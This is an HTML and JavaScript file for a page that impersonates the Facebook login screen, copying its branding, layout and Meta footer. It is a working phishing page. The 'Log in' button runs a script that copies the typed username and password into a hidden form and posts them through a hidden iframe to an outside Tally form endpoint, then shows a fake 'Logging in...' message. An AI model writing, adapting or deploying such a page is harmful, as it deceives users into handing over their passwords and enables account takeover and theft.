<head>

  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />

  <style>
    :root {
      --fb-blue: #1877f2;
      --fb-light-gray: #f0f2f5;
      --fb-dark-blue: #1c1e21;
      --fb-text-gray: #606770;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: var(--fb-light-gray);
      font-family: Arial, sans-serif;
      color: var(--fb-dark-blue);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px 10px;
    }
    .intro-text {
      text-align: center;
      margin-top: 20px;
      margin-bottom: 30px;
    }
    .intro-text h1 {
      color: var(--fb-blue);
      font-size: 32px;
    }
    .intro-text p {
      font-size: 14px;
      max-width: 320px;
      margin: 10px auto 0;
      color: var(--fb-dark-blue);
    }
    .language-toggle {
      margin-top: 10px;
      cursor: pointer;
      font-size: 14px;
      color: var(--fb-text-gray);
    }
    .login-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 90%;
      max-width: 400px;
      margin-top: 10px;
    }
    .fb-logo {
      width: 60px;
      height: 60px;
      background: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 20px 0;
    }
    .fb-logo img {
      width: 30px;
      height: 30px;
    }
    .input-group {
      position: relative;
      margin-bottom: 20px;
      width: 100%;
    }
    .input-group input {
      width: 100%;
      height: 52px;
      padding: 0 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      background: white;
      font-size: 16px;
      line-height: 48px;
    }
    .input-group label {
      position: absolute;
      top: 16px;
      left: 12px;
      color: var(--fb-text-gray);
      font-size: 14px;
      pointer-events: none;
      transition: all 0.2s ease;
    }
    .input-group input:focus + label,
    .input-group input:not(:placeholder-shown) + label {
      top: 4px;
      left: 10px;
      font-size: 12px;
      color: #555;
    }
    button.login-btn {
      width: 100%;
      background-color: var(--fb-blue);
      color: white;
      border: none;
      padding: 14px;
      border-radius: 25px;
      font-size: 16px;
      cursor: pointer;
      margin-bottom: 15px;
    }
    .forgot-password {
      color: var(--fb-blue);
      font-size: 14px;
      text-align: center;
      margin-bottom: 30px;
      cursor: pointer;
    }
    .create-account {
      width: 90%;
      max-width: 400px;
      background: white;
      border: 1px solid var(--fb-blue);
      color: var(--fb-blue);
      padding: 14px;
      border-radius: 25px;
      font-size: 16px;
      text-align: center;
      cursor: pointer;
      margin-bottom: 20px;
    }
    .meta-footer {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background-color: white;
      padding: 10px 20px;
      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
      z-index: 1000;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }
    .top-line {
      gap: 8px;
      display: flex;
      align-items: center;
      margin-bottom: 5px;
    }
    .top-line img {
      height: 22px;
    }
    .meta-text {
      font-weight: 700;
      color: #616770;
      font-size: 1rem;
    }
    .bottom-line {
      font-size: 0.8rem;
      color: #616770;
    }
    @media (max-width: 768px) {
      .top-line { gap: 4px; margin-bottom: 3px; }
      .top-line img { height: 18px; }
      .meta-text { font-size: 0.9rem; }
      .bottom-line { font-size: 0.75rem; }
    }
  </style>
</head>
<body>

  <div class="intro-text">
    <h1>Facebook</h1>
    <p>Facebook helps you connect and share with the people in your life.</p>
  </div>

  <div class="language-toggle">English (UK) â–¼</div>

  <div class="login-container">
    <div class="fb-logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
    </div>

    <div class="input-group">
      <input type="text" id="username" placeholder=" " />
      <label for="username">Mobile number or email address</label>
    </div>

    <div class="input-group">
      <input type="password" id="password" placeholder=" " />
      <label for="password">Password</label>
    </div>

    <button class="login-btn" onclick="submitToTally()">Log in</button>
    <div class="forgot-password" onclick="window.location.href='password.html'">Forgotten password?</div>
  </div>

  <button class="create-account" onclick="window.open('https://web.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>

  <div class="meta-footer">
    <div class="top-line">
      <img src="metalogo.png" alt="Meta Logo" />
      <span class="meta-text">Meta</span>
    </div>
    <div class="bottom-line">About Â· Help Â· More</div>
  </div>

  <!-- ðŸ”’ Hidden form to submit to Tally -->
  <form id="tallyForm" action="https://tally.so/r/nrb7Op" method="POST" target="tallyHiddenFrame" style="display:none;">
    <input type="text" name="entry.1" id="tally-username" />
    <input type="text" name="entry.2" id="tally-password" />
  </form>

  <!-- ðŸ”’ Hidden iframe to avoid page reload -->
  <iframe name="tallyHiddenFrame" style="display:none;"></iframe>

  <script>
    function showError(inputElement) {
      inputElement.style.borderColor = 'red';
      const error = document.createElement('div');
      error.className = 'error-message';
      error.style.color = 'red';
      error.style.fontSize = '12px';
      error.style.marginTop = '4px';
      error.textContent = 'Required';
      inputElement.parentNode.appendChild(error);
    }

    function submitToTally() {
      const usernameInput = document.getElementById("username");
      const passwordInput = document.getElementById("password");
      const username = usernameInput.value.trim();
      const password = passwordInput.value.trim();

      // Clear previous error messages
      document.querySelectorAll('.error-message').forEach(el => el.remove());
      [usernameInput, passwordInput].forEach(input => input.style.borderColor = '#ccc');

      let hasError = false;
      if (!username) { showError(usernameInput); hasError = true; }
      if (!password) { showError(passwordInput); hasError = true; }
      if (hasError) return;

      document.getElementById("tally-username").value = username;
      document.getElementById("tally-password").value = password;
      document.getElementById("tallyForm").submit();

      alert("Logging in...");
    }
  </script>

</body>
</html>
